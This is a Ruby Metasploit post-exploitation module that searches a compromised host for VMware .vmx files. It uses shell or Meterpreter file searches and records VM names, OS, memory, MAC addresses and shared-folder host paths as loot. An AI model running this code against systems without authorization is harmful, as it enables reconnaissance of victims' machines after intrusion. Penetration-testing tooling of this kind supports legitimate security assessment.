##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'yaml'

class MetasploitModule < Msf::Post
  include Msf::Post::File


  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather VMWare VM Identification',
      'Description'    => %q{
        This module will attempt to find any VMWare virtual machines stored on the target.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['theLightCosine'],
      'Platform'       => %w{ bsd linux osx unix win },
      'SessionTypes'   => ['shell', 'meterpreter' ]
    ))
  end

  def run
    if session_has_search_ext
      vms = meterp_search
    elsif session.platform =~ /unix|linux|bsd|osx/
      vms = nix_shell_search
    end
    report_vms(vms) if vms
  end

  def report_vms(vms)
    output = "VMWare Virtual Machines\n"
    output << "--------------------------------\n"
    vms.each do |vm|
      next if vm.empty?
      output << "Name: #{vm['name']}\n"
      output << "Virtual CPUs: #{vm['cpus']}\n"
      output << "Memory: #{vm['memsize']}\n"
      output << "Operating System: #{vm['os']}\n"
      output << "Network Type: #{vm['eth_type']}\n"
      output << "MAC Address: #{vm['mac']}\n"
      output << "Shared Folders:\n"
      vm['SharedFolders'].each do |folder|
        output << "\tHost Location: #{folder}\n"
      end
      output << "\n"
    end
    print_good output
    store_loot('vmware_vms', "text/plain", session, output, "vmware_vms.txt", "VMWare Virtual Machines")
  end


  def nix_shell_search
    vms = []
    res = session.shell_command('find / -name "*.vmx" -type f -print 2>/dev/null')
    res.each_line do |filename|
      next unless filename.start_with? '/'
      begin
        parse = session.shell_command("cat #{filename}")
        vms << parse_vmx(parse,filename)
      rescue
        print_error "Could not read #{filename} properly"
      end
    end
    return vms
  end

  def meterp_search
    vms = []
    res = session.fs.file.search(nil, "*.vmx", true, -1)
    res.each do |vmx|
      filename = "#{vmx['path']}\\#{vmx['name']}"
      next if filename.end_with? ".vmxf"
      begin
        config = client.fs.file.new(filename,'r')
        parse = config.read
        vms << parse_vmx(parse,filename)
      rescue
        print_error "Could not read #{filename} properly"
      end
    end
    return vms
  end


  def parse_vmx(vmx_data, filename)
    vm= {}
    unless vmx_data.nil? or vmx_data.empty?
      vm['SharedFolders'] = []
      vmx_data.each_line do |line|
        data = line.split("=")
        vm['path'] = filename
        case data[0]
        when "memsize "
          vm['memsize'] = data[1].gsub!("\"",'').lstrip.chomp
        when "displayName "
          vm['name'] = data[1].gsub!("\"",'').lstrip.chomp
        when "guestOS "
          vm['os'] = data[1].gsub!("\"",'').lstrip.chomp
        when "ethernet0.connectionType "
          vm['eth_type'] = data[1].gsub!("\"",'').lstrip.chomp
        when "ethernet0.generatedAddress "
          vm['mac'] = data[1].gsub!("\"",'').lstrip.chomp
        when "numvcpus "
          vm['cpus'] = data[1].gsub!("\"",'').lstrip.chomp
        when "sharedFolder0.hostPath "
          vm['SharedFolders'] << data[1].gsub!("\"",'').lstrip.chomp
        end
      end
      vm['cpus'] ||= "1"
    end
    return vm
  end

  def session_has_search_ext
    begin
      return !!(session.fs and session.fs.file)
    rescue NoMethodError
      return false
    end
  end


end
